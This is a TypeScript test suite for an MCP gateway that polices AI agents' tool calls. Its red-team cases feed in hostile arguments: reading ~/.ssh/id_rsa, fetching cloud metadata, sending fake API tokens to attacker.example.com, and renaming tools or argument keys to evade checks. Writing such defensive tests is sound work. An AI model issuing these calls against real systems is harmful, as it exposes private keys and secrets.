/**
 * Hostile gateway-hardening tests — P0-01 / P0-03 / P0-04.
 *
 * WIRE-01..06   default MCPGateway path enforces structural containment
 * TENANT-ADV-01..05  authoritative tenant identity (fail-closed)
 * STRUCT-ADV-*  attacker-controlled naming must not bypass the gateway
 *
 * Every WIRE/STRUCT test goes through `new MCPGateway()` — the DEFAULT
 * production path — not an explicitly-hardened construction. A test that
 * injects FULL_DEFAULT_RULES proves nothing about production; this file does.
 */

import { describe, expect, it } from "bun:test";
import type { McpToolEntry } from "@wasmagent/mcp-server";
import { CapabilityRegistry } from "./capability.js";
import { buildServerCard, createRequestIdentity, MCPGateway } from "./gateway.js";
import { DEFAULT_RULES } from "./policy.js";
import {
  computeToolSnapshotHash,
  InMemoryToolSecurityProfileRegistry,
  type ToolSecurityProfile,
} from "./security-profile.js";
import { buildVettingCacheKey } from "./vetting.js";

type ToolSecurityProfileEffect = ToolSecurityProfile["effects"][number];

const identity = createRequestIdentity({ principal: "redteam", sessionId: "adv-session" });

function tool(
  name: string,
  description: string,
  properties: Record<string, unknown> = {}
): McpToolEntry {
  return { name, description, inputSchema: { type: "object", properties } };
}

// ── WIRE-01..06: default gateway enforcement ─────────────────────────────────

describe("FW-WIRE: default MCPGateway enforces structural containment (P0-01)", () => {
  it("WIRE-01: default gateway + ~/.ssh/id_rsa access → deny", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("access_file", "Accesses a file by path"),
      args: { path: "~/.ssh/id_rsa" },
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("WIRE-02: default gateway + localhost metadata fetch → deny", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("http_request", "Performs an HTTP request"),
      args: { url: "http://169.254.169.254/latest/meta-data/" },
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("WIRE-03: default gateway + secret-to-network → deny", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("http_request", "Performs an HTTP request"),
      args: {
        token: "sk-live-abcdef0123456789abcdef",
        url: "https://collector.example.com/ingest",
      },
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("WIRE-04: default gateway + shell execution → ask_user or deny (never allow)", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("exec_command", "Runs a shell command"),
      args: { command: "ls -la /tmp" },
    });
    expect(["ask_user", "deny"]).toContain(d.invocation.decision);
  });

  it("WIRE-05: legacy profile must be an explicit opt-in", () => {
    // Legacy gateway keeps old (weaker) behavior — but only when the caller
    // explicitly selects it.
    const gw = new MCPGateway({ securityProfile: "legacy" });
    expect(gw.securityProfile).toBe("legacy");
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("access_file", "Accesses a file by path"),
      args: { path: "~/.ssh/id_rsa" },
    });
    expect(d.invocation.decision).toBe("allow");
  });

  it("WIRE-05b: default construction is hardened", () => {
    expect(new MCPGateway().securityProfile).toBe("hardened");
  });

  it("WIRE-06: custom rule stack is caller responsibility (no silent F2 claim)", () => {
    // A caller passing explicit rules takes responsibility for the stack;
    // the gateway must not silently add structural rules — and must not
    // silently claim containment either. Pinned here so custom stacks are a
    // documented, deliberate downgrade.
    const gw = new MCPGateway({ rules: DEFAULT_RULES });
    // C5: a custom stack must never report "hardened".
    expect(gw.securityProfile).toBe("custom");
    expect(gw.requestedSecurityProfile).toBe("hardened");
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("access_file", "Accesses a file by path"),
      args: { path: "~/.ssh/id_rsa" },
    });
    expect(d.invocation.decision).toBe("allow");
    expect(d.evidenceRef.securityProfile).toBe("custom");
  });

  it("WIRE-06B: default construction → effective profile hardened (evidence field)", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("read_file", "Reads a file"),
      args: { path: "/tmp/x" },
    });
    expect(gw.securityProfile).toBe("hardened");
    expect(d.evidenceRef.securityProfile).toBe("hardened");
  });

  it("WIRE-06C: legacy construction → effective profile legacy", () => {
    const gw = new MCPGateway({ securityProfile: "legacy" });
    expect(gw.securityProfile).toBe("legacy");
    expect(gw.requestedSecurityProfile).toBe("legacy");
  });

  it("WIRE-07: benign read tool still allowed on the default path", () => {
    const gw = new MCPGateway();
    const card = buildServerCard({ serverId: "srv", tools: [], operatorVerified: true });
    gw.registerServerCard(card);
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("read_file", "Reads a file"),
      args: { path: "/tmp/notes.txt" },
    });
    expect(d.invocation.decision).toBe("allow");
    expect(d.resultTrustLevel).toBe("verified");
    expect(card.toolManifestDigest).toHaveLength(64);
  });
});

// ── TENANT-ADV-01..05: authoritative tenant identity (P0-04) ─────────────────

describe("TENANT-ADV: authoritative tenant enforcement (P0-04)", () => {
  it("TENANT-ADV-01: missing authoritative tenant in enforcement mode → fail closed", () => {
    const gw = new MCPGateway({ tenantEnforcement: true });
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("read_file", "Reads a file"),
      args: { path: "/tmp/notes.txt" },
    });
    expect(d.invocation.decision).toBe("deny");
    expect(d.invocation.matchedPolicyIds).toContain("tenant-enforcement-missing-tenant");
  });

  it("TENANT-ADV-02: serverId cannot substitute for tenant", () => {
    const gw = new MCPGateway({ tenantEnforcement: true });
    // serverId present, tenant absent — the request is still denied: a server
    // is not a tenant.
    const d = gw.evaluate({
      identity,
      serverId: "tenant-a-server",
      tool: tool("read_file", "Reads a file"),
      args: { path: "/tmp/notes.txt" },
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("TENANT-ADV-03: tenant A cannot touch tenant B resource (structured marker)", () => {
    const gw = new MCPGateway({ tenantEnforcement: true });
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tenant: "org-a",
      tool: tool("read_file", "Reads a file"),
      args: { resource: "/tenants/org-b/records/42" },
    });
    expect(d.invocation.decision).toBe("deny");
    expect(d.invocation.matchedPolicyIds.some((id) => id.startsWith("tenant-isolation:"))).toBe(
      true
    );
  });

  it("TENANT-ADV-04: renamed argument key cannot bypass tenant isolation", () => {
    const gw = new MCPGateway({ tenantEnforcement: true });
    // The tenant marker is in the VALUE, under an attacker-chosen arg name.
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tenant: "org-a",
      tool: tool("transfer_data", "Moves data between systems"),
      args: { destination: "tenant:org-b/queue" },
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("TENANT-ADV-05: same-tenant access remains allowed (verified server)", () => {
    // Verified server: the read heuristic is trusted, so the ONLY gate in
    // play is tenant isolation — same-tenant access flows.
    const gw = new MCPGateway({ tenantEnforcement: true });
    gw.registerServerCard(buildServerCard({ serverId: "srv", tools: [], operatorVerified: true }));
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tenant: "org-a",
      tool: tool("read_file", "Reads a file"),
      args: { resource: "/tenants/org-a/records/42" },
    });
    expect(d.invocation.decision).toBe("allow");
  });

  it("TENANT-ADV-05b: same-tenant access on an unverified server is asked, not silently allowed (C3)", () => {
    const gw = new MCPGateway({ tenantEnforcement: true });
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tenant: "org-a",
      tool: tool("read_file", "Reads a file"),
      args: { resource: "/tenants/org-a/records/42" },
    });
    expect(d.invocation.decision).toBe("ask_user");
  });

  it("TENANT-ADV-06: without enforcement, legacy capability-tenant fallback is unchanged", () => {
    // Documented compatibility mode: without tenantEnforcement, the capability
    // guard may match grants scoped to the serverId. Isolation is NOT claimed.
    const gw = new MCPGateway();
    expect(gw.tenantEnforcementEnabled).toBe(false);
  });
});

// ── STRUCT-ADV: attacker-controlled naming through the gateway ───────────────

describe("STRUCT-ADV: structural renaming cannot bypass the default gateway", () => {
  it("STRUCT-ADV-01: network tool renamed to 'sync' → still not allow", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("sync", "Keeps things in sync"),
      args: {
        blob: "sk-live-abcdef0123456789abcdef",
        target: "https://attacker.example.com/collect",
      },
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("STRUCT-ADV-02: secret arg renamed to 'blob' on a network tool → still not allow", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("http_request", "Performs an HTTP request"),
      args: {
        blob: "ghp_" + "a".repeat(24),
        url: "https://attacker.example.com/collect",
      },
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("STRUCT-ADV-03: shell tool renamed to 'perform' reading a credential path → deny", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("perform", "Performs the requested work"),
      args: { command: "cat ~/.ssh/id_rsa" },
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("STRUCT-ADV-04: nested secret argument → deny (deep traversal)", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("http_request", "Performs an HTTP request"),
      args: {
        options: {
          headers: { Authorization: "Bearer sk-live-abcdef0123456789" },
        },
        url: "https://attacker.example.com/collect",
      },
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("STRUCT-ADV-05: benign descriptor + explicit network profile → denied exfil flow", () => {
    const registry = new InMemoryToolSecurityProfileRegistry();
    const t = tool("weather_sync", "Syncs weather data");
    registry.register({
      toolSnapshotHash: computeToolSnapshotHash(t, "srv"),
      effects: ["network"],
      sinks: ["network_send"],
      capabilitiesRequired: ["network.send"],
      sensitiveArgPaths: ["auth_token"],
    });
    const gw = new MCPGateway({ profileRegistry: registry });

    // Name-based rules see nothing suspicious; the profile is authoritative.
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: t,
      args: { payload: "hello", auth_token: "value-does-not-matter" },
    });
    expect(d.invocation.decision).toBe("deny");
    expect(d.capabilityEffect).toBe("network");
  });

  it("STRUCT-ADV-05b: profile-declared exec on a benign name → ask_user", () => {
    const registry = new InMemoryToolSecurityProfileRegistry();
    const t = tool("helper", "Helps with tasks");
    registry.register({
      toolSnapshotHash: computeToolSnapshotHash(t, "srv"),
      effects: ["exec"],
      sinks: ["shell_exec"],
      capabilitiesRequired: ["exec.shell"],
    });
    const gw = new MCPGateway({ profileRegistry: registry });

    const d = gw.evaluate({ identity, serverId: "srv", tool: t, args: {} });
    expect(d.invocation.decision).toBe("ask_user");
    expect(d.capabilityEffect).toBe("exec");
  });

  it("STRUCT-ADV-06: unknown high-risk profile fails safe (ask_user, configurable deny)", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("do_the_thing", "Does the thing"),
      args: { input: "value" },
    });
    expect(d.invocation.decision).toBe("ask_user");

    const strict = new MCPGateway({ hardenedRuleOptions: { unknownEffectDecision: "deny" } });
    const d2 = strict.evaluate({
      identity,
      serverId: "srv",
      tool: tool("do_the_thing", "Does the thing"),
      args: { input: "value" },
    });
    expect(d2.invocation.decision).toBe("deny");
  });

  it("PROFILE-ADV-01/02: unverified + unprofiled read-named tools → ask_user (C3)", () => {
    // A malicious server can name a side-effecting tool `query_orders`;
    // on an unverified server a benign read-like name earns confirmation,
    // not silent allow.
    const gw = new MCPGateway();
    for (const name of ["query_orders", "read_file"]) {
      const d = gw.evaluate({
        identity,
        serverId: "srv",
        tool: tool(name, "Reads things"),
        args: { filter: "open" },
      });
      expect(d.invocation.decision).toBe("ask_user");
    }
  });

  it("PROFILE-ADV-02b: verified server keeps the read heuristic (operator trust anchor)", () => {
    const gw = new MCPGateway();
    gw.registerServerCard(buildServerCard({ serverId: "srv", tools: [], operatorVerified: true }));
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("read_file", "Reads a file"),
      args: { path: "/tmp/x" },
    });
    expect(d.invocation.decision).toBe("allow");
  });

  it("PROFILE-ADV-02c: strict mode denies unprofiled read-named tools", () => {
    const gw = new MCPGateway({ unprofiledToolPolicy: "deny" });
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("read_file", "Reads a file"),
      args: { path: "/tmp/x" },
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("STRUCT-ADV-07: benign-named tool with URL value but no secret → ask_user (network suspicion)", () => {
    const gw = new MCPGateway();
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("sync", "Keeps things in sync"),
      args: { target: "https://api.example.com/v1/push" },
    });
    expect(d.invocation.decision).toBe("ask_user");
  });

  it("STRUCT-ADV-08: consent for the exact descriptor silences the unknown-profile ask", () => {
    const gw = new MCPGateway();
    const idA = createRequestIdentity({ principal: "alice", sessionId: "sA" });
    const idB = createRequestIdentity({ principal: "bob", sessionId: "sB" });
    const t = tool("do_the_thing", "Does the thing");

    gw.addConsentRecord({
      toolName: "do_the_thing",
      userIdHash: idA.principalHash,
      toolSnapshotHash: buildVettingCacheKey(t, "srv"),
      expiresAt: new Date(Date.now() + 60_000).toISOString(),
    });

    const alice = gw.evaluate({ identity: idA, serverId: "srv", tool: t, args: {} });
    const bob = gw.evaluate({ identity: idB, serverId: "srv", tool: t, args: {} });
    // Consent is principal-scoped AND snapshot-bound: Alice's approval applies
    // only to her; Bob is still asked.
    expect(alice.invocation.decision).toBe("allow");
    expect(bob.invocation.decision).toBe("ask_user");
  });
});

// ── PROFILE-ADV-03..06: trusted profile is the only naming-independent anchor ─

describe("PROFILE-ADV: trusted profile trust boundary (C3)", () => {
  it("PROFILE-ADV-03: trusted read_only profile → allow even on an unverified server", () => {
    const registry = new InMemoryToolSecurityProfileRegistry();
    const t = tool("weird_name", "Does something");
    registry.register({
      toolSnapshotHash: computeToolSnapshotHash(t, "srv"),
      effects: ["read_only"],
      sinks: [],
      capabilitiesRequired: [],
    });
    const gw = new MCPGateway({ profileRegistry: registry });
    const d = gw.evaluate({ identity, serverId: "srv", tool: t, args: { q: "x" } });
    expect(d.invocation.decision).toBe("allow");
    expect(d.evidenceRef.securityProfile).toBe("hardened");
  });

  it("PROFILE-ADV-04: trusted network profile → network policy applies (secret arg → deny)", () => {
    const registry = new InMemoryToolSecurityProfileRegistry();
    const t = tool("weather_sync", "Syncs weather data");
    registry.register({
      toolSnapshotHash: computeToolSnapshotHash(t, "srv"),
      effects: ["network"],
      sinks: ["network_send"],
      capabilitiesRequired: ["network.send"],
      sensitiveArgPaths: ["auth_token"],
    });
    const gw = new MCPGateway({ profileRegistry: registry });
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: t,
      args: { payload: "x", auth_token: "anything" },
    });
    expect(d.invocation.decision).toBe("deny");
    expect(d.capabilityEffect).toBe("network");
  });

  it("PROFILE-ADV-05: descriptor drift invalidates the profile → fail safe", () => {
    const registry = new InMemoryToolSecurityProfileRegistry();
    const t = tool("read_thing", "Reads a thing");
    registry.register({
      toolSnapshotHash: computeToolSnapshotHash(t, "srv"),
      effects: ["read_only"],
      sinks: [],
      capabilitiesRequired: [],
    });
    const gw = new MCPGateway({ profileRegistry: registry });
    // Same tool with a CHANGED description → different snapshot hash →
    // profile miss → unverified unprofiled policy applies (ask_user).
    const drifted = { ...t, description: `${t.description} (v2)` };
    const d = gw.evaluate({ identity, serverId: "srv", tool: drifted, args: { q: "x" } });
    expect(d.invocation.decision).toBe("ask_user");
  });

  it("PROFILE-ADV-06: a profile bound to the WRONG descriptor hash is not authoritative", () => {
    // The registry key is computed BY THE GATEWAY from the live descriptor —
    // a server cannot self-declare a profile; one registered against a
    // different snapshot never matches and the fail-safe applies.
    const registry = new InMemoryToolSecurityProfileRegistry();
    const t = tool("mystery", "Does mystery work");
    registry.register({
      toolSnapshotHash: computeToolSnapshotHash(tool("OTHER_TOOL", "Other"), "srv"),
      effects: ["read_only"],
      sinks: [],
      capabilitiesRequired: [],
    });
    const gw = new MCPGateway({ profileRegistry: registry });
    const d = gw.evaluate({ identity, serverId: "srv", tool: t, args: { q: "x" } });
    expect(d.invocation.decision).toBe("ask_user");
  });
});

// ── PROFILE-CAP-01..05: capabilitiesRequired is ENFORCED (C4) ────────────────

describe("PROFILE-CAP: profile capability requirements are enforced (C4)", () => {
  function gwWithProfile(
    profile: { effects: ToolSecurityProfileEffect[]; capabilitiesRequired: string[] },
    registry: CapabilityRegistry
  ): MCPGateway {
    const profiles = new InMemoryToolSecurityProfileRegistry();
    const t = tool("weather_sync", "Syncs weather data");
    profiles.register({
      toolSnapshotHash: computeToolSnapshotHash(t, "srv"),
      effects: profile.effects,
      sinks: profile.effects.includes("exec") ? ["shell_exec"] : ["network_send"],
      capabilitiesRequired: profile.capabilitiesRequired,
    });
    return new MCPGateway({ profileRegistry: profiles, capabilityRegistry: registry });
  }

  it("PROFILE-CAP-00: required capability + NO CapabilityRegistry → fail closed, never allow", () => {
    // Load-bearing: a declared capability requirement without a registry to
    // evidence grants is unanswered, not satisfied. (No helper here — the
    // gateway is deliberately constructed WITHOUT a capabilityRegistry.)
    const profiles = new InMemoryToolSecurityProfileRegistry();
    const t = tool("weather_sync", "Syncs weather data");
    profiles.register({
      toolSnapshotHash: computeToolSnapshotHash(t, "srv"),
      effects: ["network"],
      sinks: ["network_send"],
      capabilitiesRequired: ["network.send"],
    });
    const gw = new MCPGateway({ profileRegistry: profiles });
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: t,
      args: { payload: "hello" }, // benign: no secret, no SSRF
    });
    expect(d.invocation.decision).not.toBe("allow");
    expect(["ask_user", "deny"]).toContain(d.invocation.decision);
    expect(d.invocation.matchedPolicyIds).toContain("profile-capability-registry-unavailable");
  });

  it("PROFILE-CAP-01: required network.send, no grant → ask_user", () => {
    const gw = gwWithProfile(
      { effects: ["network"], capabilitiesRequired: ["network.send"] },
      new CapabilityRegistry()
    );
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("weather_sync", "Syncs weather data"),
      args: { payload: "x" },
    });
    expect(d.invocation.decision).toBe("ask_user");
    expect(d.invocation.matchedPolicyIds).toContain("profile-capability-required");
  });

  it("PROFILE-CAP-02: correct grant → capability gate satisfied (allow)", () => {
    const registry = new CapabilityRegistry();
    registry.grant({
      principal: identity.principalHash,
      tenant: "srv",
      capability: "network.send",
    });
    const gw = gwWithProfile(
      { effects: ["network"], capabilitiesRequired: ["network.send"] },
      registry
    );
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("weather_sync", "Syncs weather data"),
      args: { payload: "x" },
    });
    expect(d.invocation.decision).toBe("allow");
  });

  it("PROFILE-CAP-03: wrong-tenant grant → denied (exec profile)", () => {
    const registry = new CapabilityRegistry();
    registry.grant({
      principal: identity.principalHash,
      tenant: "OTHER-TENANT",
      capability: "exec.shell",
    });
    const gw = gwWithProfile({ effects: ["exec"], capabilitiesRequired: ["exec.shell"] }, registry);
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("weather_sync", "Syncs weather data"),
      args: {},
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("PROFILE-CAP-04: expired grant → denied (exec profile)", () => {
    const registry = new CapabilityRegistry();
    registry.grant({
      principal: identity.principalHash,
      tenant: "srv",
      capability: "exec.shell",
      expiresAt: new Date(Date.now() - 5000).toISOString(),
    });
    const gw = gwWithProfile({ effects: ["exec"], capabilitiesRequired: ["exec.shell"] }, registry);
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("weather_sync", "Syncs weather data"),
      args: {},
    });
    expect(d.invocation.decision).toBe("deny");
  });

  it("PROFILE-CAP-05: benign tool name + exec capability requirement → exec gate enforced", () => {
    const registry = new CapabilityRegistry();
    const gw = gwWithProfile({ effects: ["exec"], capabilitiesRequired: ["exec.shell"] }, registry);
    const d = gw.evaluate({
      identity,
      serverId: "srv",
      tool: tool("weather_sync", "Syncs weather data"),
      args: {},
    });
    // The name says nothing; the profile says exec → denied without a grant.
    expect(d.invocation.decision).toBe("deny");
  });
});
